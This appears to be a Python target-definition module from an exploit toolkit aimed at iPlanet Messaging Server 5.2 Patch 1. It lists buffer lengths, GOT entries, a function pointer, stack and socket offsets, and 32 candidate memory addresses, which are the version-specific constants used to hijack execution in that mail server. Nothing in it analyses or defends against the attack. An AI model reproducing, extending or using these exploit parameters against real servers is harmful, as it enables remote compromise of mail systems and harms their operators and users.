import iplanet

class iplanet_5_2p1(iplanet.type3):
   def __init__(self):
      self.conn = 0

   version = 'iPlanet Messaging Server 5.2 Patch 1 (built Aug 19 2002)'
   baseBufLen = 0x1bc
   l7Offset = -0x23fcL
   l7Imta = 0x553674L
   l7ImtaResponse = 0x53ae08L
   got = [0x55db10L, 0x4fa050L, 0x4fa058L, 0x4fa060L]
   fp = 0x978160L
   bigBufOffset = -0x26f8L
   socketOffset = -0x3d8L
   addrs = \
      [0x55D06CL ,
       0x5AB18CL ,
       0x5CC9D8L ,
       0x5EECCCL ,
       0x60DAF0L ,
       0x629C04L ,
       0x6469CCL ,
       0x66305CL ,
       0x67F634L ,
       0x69B5F0L ,
       0x6B9254L ,
       0x6D65E8L ,
       0x6F6B10L ,
       0x713994L ,
       0x7301ECL ,
       0x74C33CL ,
       0x769078L ,
       0x785C80L ,
       0x7A24F8L ,
       0x7BE96CL ,
       0x7DBCECL ,
       0x7FA214L ,
       0x827398L ,
       0x848678L ,
       0x866C30L ,
       0x88508CL ,
       0x8B53E0L ,
       0x8E536CL ,
       0x902F50L ,
       0x91F618L ,
       0x93D178L ,
       0x95B5B8L ]
